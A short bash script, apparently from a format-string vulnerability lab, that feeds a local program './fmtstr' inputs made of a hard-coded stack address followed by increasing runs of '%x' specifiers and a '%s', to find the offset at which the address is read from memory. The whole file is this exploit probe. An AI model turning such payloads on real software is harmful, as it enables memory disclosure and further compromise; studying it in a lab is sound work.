#!/bin/bash

# echo $(printf "\x64\xe9\xff\xbf").%x.%x.%x.%x.%x.%x.%x.%x > input

for i in {1..20}; do
  fmt="%x"
  pattern=$(printf ".%s" $(yes "$fmt" | head -n $i))
  echo $(printf "\x64\xe9\xff\xbf")$pattern.%s > input
  echo "Testing with $i %x parameters:"
  ./fmtstr < input | grep -A 1 "Please enter"
done